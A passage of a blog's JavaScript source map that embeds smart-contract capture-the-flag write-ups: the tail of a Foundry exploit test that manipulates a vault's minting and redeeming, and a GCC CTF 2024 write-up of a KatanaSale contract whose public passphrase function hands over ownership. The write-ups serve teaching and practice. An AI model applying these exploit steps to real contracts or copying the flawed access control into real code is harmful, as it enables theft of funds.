1e18\n        );\n        console.log(\"total supply of vault  after minting by the attacker\", setupp.vault().totalSupply() / 1e18);\n\n        setupp.grey().approve(address(setupp.vault()), 1);\n\n        setupp.vault().mint(1);\n\n        console.log(\"balance of attacker after minting\", setupp.vault().asset().balanceOf(attacker) / 1e18);\n        console.log(\"total supply of vault  after redeeming\", setupp.vault().totalSupply() / 1e18);\n\n        setupp.vault().redeem(1);\n\n        console.log(\"balance of attacker after redeeming 2nd time\", setupp.vault().asset().balanceOf(attacker) / 1e18);\n        console.log(\"total supply of vault after redeeming 2nd time\", setupp.vault().totalSupply() / 1e18);\n\n        assertTrue(setupp.isSolved(), \"not solved\");\n    }\n}\n\n\\`\\`\\`\n## Solutions Repo\n\n[Grey Cat The Flag 2025 Solutions](https://github.com/BhaskarPeruri/Grey_Cat_The_Flag_2025_Solutions)\n\n\n## Conclusion\n\nThis challenge demonstrates how subtle bugs in custom mathematical libraries can lead to catastrophic failures in DeFi protocols. The vulnerability in the rational arithmetic library allowed complete bypass of the vault's accounting system, highlighting the importance of thorough testing of custom mathematical operations, especially edge cases involving zero values.`,\n};\n","import { Blog } from \"../blog-data\";\n\nexport const GCCCTF2024web3CTFChallengeWriteUp: Blog = {\n  slug: \"GCCCTF2024web3CTFChallengeWriteUp\",\n  title: \"GCC CTF 2024 web3  challenge writeup\",\n  excerpt:\n    \"Check out my writeup for the GCC CTF 2024 web3 CTF Challenge WriteUp.\",\n  date: \"2024-04-11\",\n  readTime: \"5 min read\",\n  tags: [\"CTF\", \"GCC\", \"web3\", \"writeup\"],\n  image: \"/gccCTF.jpeg\",\n  content: `\n# synthatsu_katana_thief\n\n### Challenge 1\n\n2000 years from now, the earth has seen many wars, and the surface of the earth was forever damaged. Humans had to develop floating cities, the first one was Synthatsu, made by what was left of the Japanese history. Mixing futuristic building with a hint of traditional looks. This town was well known for its close combat weapons. One of the most prized katana maker works in that town. But just yesterday, some thugs named Beyond robbed his shop, and took some of his work!\n\n### Goal:\n\nWill you be able to get them for yourself?\n\n### Challenge.sol\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./KatanaSale.sol\";\n\ncontract Challenge{\n    KatanaSale public katanaSale;\n    address constant public PLAYER = 0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85;\n\n    constructor () payable {\n        katanaSale = new KatanaSale(10 ether, 100);\n    }\n\n    function isSolved() public view returns(bool){\n        if(katanaSale.balanceOf(PLAYER) >= 60){\n            return true;\n        }\n        return false;\n    }\n\n}\n\\`\\`\\`\n\n### KatanaSale.sol\n\n\\`\\`\\`solidity\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract KatanaSale {\n\n    address public beyond;\n    uint256 public katanaPrice;\n    uint256 public katanaSold;\n    string public name = \"one-katana\";\n    string public symbol = \"KTN\";\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    event Sold(address buyer, uint256 amount);\n\n    constructor(uint256 _katanaPrice, uint256 _totalSupply) {\n        beyond = msg.sender;\n        katanaPrice = _katanaPrice;\n        totalSupply = _totalSupply;\n    }\n\n    function transfer(address to, uint256 value) external {\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function becomeBeyond(string memory passPhrase) external {\n        require (keccak256(abi.encode(passPhrase)) == keccak256(abi.encode(\"I will check out @BeyondBZH and @gcc_ensibs on X\")));\n        beyond = msg.sender;\n    }\n\n    function buyKatana(uint256 _numberOfKatana) external payable {\n        require(msg.value == _numberOfKatana * katanaPrice, \"Incorrect Ether value\");\n        katanaSold += _numberOfKatana;\n        balanceOf[msg.sender] += _numberOfKatana;\n        emit Sold(msg.sender, _numberOfKatana);\n    }\n\n    function endSale() external {\n        require(msg.sender == beyond, \"Only a true Beyond can end the sale\");\n        balanceOf[msg.sender] += totalSupply - katanaSold;\n    }\n}\n\\`\\`\\`\n\n### Solution:\n\nTo solve this challenge, we need to make the balance of the player greater than or equal to 60, for that follow the steps\n\n1. When we call the \\`becomeBeyond()\\` with the arguement **I will check out @BeyondBZH and @gcc_ensibs on X**, then we became the beyond.\n\n2. Call the \\`endSale()\\` and we got the totalSupply since we don't call the buyKatana().\n\n### Solution Contract\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract KatanaSale {\n\n    address public beyond;\n    uint256 public katanaPrice;\n    uint256 public katanaSold;\n    string public name = \"one-katana\";\n    string public symbol = \"KTN\";\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    event Sold(address buyer, uint256 amount);\n\n    constructor(uint256 _katanaPrice, uint256 _totalSupply) {\n        beyond = msg.sender;\n        katanaPrice = _katanaPrice;\n        totalSupply = _totalSupply;\n    }\n\n    function transfer(address to, uint256 value) external {\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function becomeBeyond(string memory passPhrase) external {\n        require (keccak256(abi.encode(passPhrase)) == keccak256(abi.encode(\"I will check out @BeyondBZH and @gcc_ensibs on X\")));\n        beyond = msg.sender;\n    }\n\n    function buyKatana(uint256 _numberOfKatana) external payable {\n        require(msg.value == _numberOfKatana * katanaPrice, \"Incorrect Ether value\");\n        katanaSold += _numberOfKatana;\n        balanceOf[msg.sender] += _numberOfKatana;\n        emit Sold(msg.sender, _numberOfKatana);\n    }\n\n    function endSale() external {\n        require(msg.sender == beyond, \"Only a true Beyond can end the sale\");\n        balanceOf[msg.sender] += totalSupply - katanaSold;\n    }\n}\n\ncontract Challenge{\n    KatanaSale public katanaSale;\n    address constant public PLAYER = 0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85;\n\n    constructor () payable {\n        katanaSale = new KatanaSale(10 ether, 100);\n    }\n\n    function isSolved() public view returns(bool){\n        if(katanaSale.balanceOf(PLAYER) >= 60){\n            return true;\n        }\n        return false;\n    }\n\n}\n\\`\\`\\`\n`,\n};\n","// Blog post type definition\nexport interface Blog {\n  slug: string;\n  title: string;\n  excerpt: string;\n  date: string;\n  readTime: string;\n  tags: string[];\n  content: string;\n  image?: string;\n}\n\n// Import individual blog posts\nimport { EthernautCTFChallengesWriteups } from \"./blogs/EthernautCTFChallengesWriteups\";\nimport { GreyCatTheFlag2025RationalChallengeWriteup } from \"./blogs/GreyCatTheFlag2025RationalChallengeWriteup\";\nimport { GCCCTF2024web3CTFChallengeWriteUp } from \"./blogs/GCCCTF2024web3CTFChallengeWriteUp\";\n\n// Export all blogs as an array\nexport const blogs: Blog[] = [\n  EthernautCTFChallengesWriteups,\n  GreyCatTheFlag2025RationalChallengeWriteup,\n  GCCCTF2024web3CTFChallengeWriteUp,\n];\n"],"names":[],"mappings":"uCAEO,IAAM,EAAuC,CAClD,KAAM,oCACN,MAAO,oCACP,QAAS,gEACT,KAAM,aACN,SAAU,cACV,KAAM,CAAC,WAAY,YAAa,eAAgB,MAAO,WAAW,CAClE,MAAO,mBACP,QAAS,CAAC;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;AAimHZ,CAAC,AACD,EC1mHa,EAAmD,CAC9D,KAAM,8BACN,MAAO,oDACP,QACE,yJACF,KAAM,aACN,SAAU,cACV,KAAM,CACJ,MACA,0BACA,WACA,yBACD,CACD,MAAO,sBACP,QAAS,CAAC;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;gXA4coW,CAAC,AACjX,EC3da,EAA0C,CACrD,KAAM,oCACN,MAAO,uCACP,QACE,wEACF,KAAM,aACN,SAAU,aACV,KAAM,CAAC,MAAO,MAAO,OAAQ,UAAU,CACvC,MAAO,eACP,QAAS,CAAC;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;AAmKZ,CAAC,AACD,iBC7J6B,CAC3B,EACA,EACA,EACD"}